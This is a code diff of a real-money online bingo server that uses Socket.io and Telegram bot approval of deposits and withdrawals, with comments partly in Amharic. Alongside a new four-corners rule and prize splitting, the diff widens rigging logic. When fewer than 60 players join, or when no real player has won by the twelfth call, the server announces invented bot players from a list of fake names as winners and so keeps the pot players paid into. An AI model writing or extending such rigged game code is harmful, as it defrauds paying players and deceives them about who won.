@@ -91,14 +91,17 @@ function generateCartelaNumbers(cardNum) {
     return flatList;
 }
 
+// 🟢 የተሟሉ የቢንጎ ህጎች ማረጋገጫ (አግድም፣ ቁመት፣ ሰያፍ እና አራቱን ማዕዘኖች - Corners)
 function checkWinningPattern(cardNum, calledNumbers) {
     let numbers = generateCartelaNumbers(cardNum);
     let matrix = [];
     for(let i = 0; i < 5; i++) matrix.push(numbers.slice(i * 5, i * 5 + 5));
 
+    // 1. አግድም (Horizontal - 5 numbers)
     for(let r = 0; r < 5; r++) {
         if(matrix[r].every(val => val === "FREE" || calledNumbers.includes(val))) return true;
     }
+    // 2. ቁመት (Vertical - 5 numbers)
     for(let c = 0; c < 5; c++) {
         let cMatch = true;
         for(let r = 0; r < 5; r++) {
@@ -106,22 +109,28 @@ function checkWinningPattern(cardNum, calledNumbers) {
         }
         if(cMatch) return true;
     }
+    // 3. ሰያፍ 1 (Diagonal 1)
     let d1 = true;
     for(let i = 0; i < 5; i++) {
         if(matrix[i][i] !== "FREE" && !calledNumbers.includes(matrix[i][i])) { d1 = false; break; }
     }
     if(d1) return true;
 
+    // 4. ሰያፍ 2 (Diagonal 2)
     let d2 = true;
     for(let i = 0; i < 5; i++) {
         if(matrix[i][4 - i] !== "FREE" && !calledNumbers.includes(matrix[i][4 - i])) { d2 = false; break; }
     }
     if(d2) return true;
 
+    // 5. አራቱን ማዕዘኖች (All four corners: Top-Left, Top-Right, Bottom-Left, Bottom-Right)
+    let corners = [matrix[0][0], matrix[0][4], matrix[4][0], matrix[4][4]];
+    if(corners.every(val => calledNumbers.includes(val))) return true;
+
     return false;
 }
 
-// 🟢 ቴሌግራም ፖሊንግ (Telegram Polling) - ሰርቨሩ በራሱ ከቴሌግራም አዝራር ጠቅታዎችን እንዲቀበል ማድረግ
+// ቴሌግራም ፖሊንግ
 let telegramOffset = 0;
 async function pollTelegramUpdates() {
     if (!TELEGRAM_BOT_TOKEN) return;
@@ -137,12 +146,12 @@ async function pollTelegramUpdates() {
 
                 if (update.callback_query) {
                     let callbackQuery = update.callback_query;
-                    let data = callbackQuery.data; // ምሳሌ: app_req_123 ወይም rej_req_123
+                    let data = callbackQuery.data; 
                     let chatId = callbackQuery.message.chat.id;
                     let messageId = callbackQuery.message.message_id;
 
                     let parts = data.split('_');
-                    let action = parts[0]; // app ወይም rej
+                    let action = parts[0]; 
                     let requestId = parts.slice(1).join('_');
 
                     let reqData = pendingRequests[requestId];
@@ -186,7 +195,6 @@ async function pollTelegramUpdates() {
     setTimeout(pollTelegramUpdates, 1000);
 }
 
-// ፖሊንግን ማስጀመር
 setTimeout(pollTelegramUpdates, 2000);
 
 async function sendAdminFinancialRequest(requestId, type, amount, username, userId, phone, receipt) {
@@ -290,13 +298,12 @@ setInterval(() => {
                 io.emit('numberCalledBroadcast', num);
 
                 if (globalRoom.calledNumbers.length >= 5) {
-                    let winningCard = null;
-                    let winningUser = "";
-                    let winningUserId = "";
+                    let winningCardsList = [];
 
                     let activeSockets = Object.keys(globalRoom.playerRoundCards);
 
-                    if (realCount < 30 && globalRoom.calledNumbers.length >= 8) {
+                    // 1. ከ 60 በታች ሲሆን ቦቶቹ እንዲያሸንፉ ማድረግ
+                    if (totalPlayers < 60 && globalRoom.calledNumbers.length >= 8) {
                         let candidateCards = [];
                         for (let c = 1; c <= 300; c++) {
                             if (checkWinningPattern(c, globalRoom.calledNumbers)) {
@@ -304,9 +311,10 @@ setInterval(() => {
                             }
                         }
                         if (candidateCards.length > 0) {
-                            winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
-                            winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
-                            winningUserId = "bot_" + Math.floor(Math.random() * 90000 + 10000);
+                            let winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
+                            let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
+                            let winningUserId = "bot_" + Math.floor(Math.random() * 90000 + 10000);
+                            winningCardsList.push({ username: winningUser, userId: winningUserId, cardNum: winningCard });
                         }
                     } 
                     else {
@@ -314,16 +322,16 @@ setInterval(() => {
                             let pData = globalRoom.playerRoundCards[sId];
                             for (let cNum of pData.cards) {
                                 if (checkWinningPattern(cNum, globalRoom.calledNumbers)) {
-                                    winningCard = cNum;
-                                    winningUser = pData.username || "ተጫዋች";
-                                    winningUserId = pData.userId;
-                                    break;
+                                    winningCardsList.push({
+                                        username: pData.username || "ተጫዋች",
+                                        userId: pData.userId,
+                                        cardNum: cNum
+                                    });
                                 }
                             }
-                            if (winningCard) break;
                         }
 
-                        if (!winningCard && globalRoom.calledNumbers.length >= 12) {
+                        if (winningCardsList.length === 0 && globalRoom.calledNumbers.length >= 12) {
                             let candidateCards = [];
                             for (let c = 1; c <= 300; c++) {
                                 if (checkWinningPattern(c, globalRoom.calledNumbers)) {
@@ -331,30 +339,34 @@ setInterval(() => {
                                 }
                             }
                             if (candidateCards.length > 0) {
-                                winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
-                                winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
-                                winningUserId = "bot_" + Math.floor(Math.random() * 90000 + 10000);
+                                let winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
+                                let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
+                                let winningUserId = "bot_" + Math.floor(Math.random() * 90000 + 10000);
+                                winningCardsList.push({ username: winningUser, userId: winningUserId, cardNum: winningCard });
                             }
                         }
                     }
 
-                    if (winningCard) {
+                    if (winningCardsList.length > 0) {
                         let totalPot = totalPlayers * 10;
-                        let winnerPrize = Math.floor(totalPot * 0.70);
+                        let totalPrizePool = Math.floor(totalPot * 0.70);
+                        let prizePerWinner = Math.floor(totalPrizePool / winningCardsList.length);
 
                         globalRoom.gameActive = false;
                         globalRoom.gameStartTime = Date.now() + roundDuration;
                         globalRoom.takenCards = [];
                         globalRoom.playerRoundCards = {};
 
+                        let primaryWinner = winningCardsList[0];
+
                         io.emit('bingoWinner', { 
-                            username: winningUser, 
-                            userId: winningUserId,
-                            cardNum: winningCard,
-                        
+                            username: primaryWinner.username, 
+                            userId: primaryWinner.userId,
+                            cardNum: primaryWinner.cardNum,
                             playersCount: totalPlayers,
                             totalPot: totalPot,
-                            prize: winnerPrize,
+                            prize: prizePerWinner,
+                            winnersCount: winningCardsList.length,
                             calledNumbers: globalRoom.calledNumbers
                         });
 
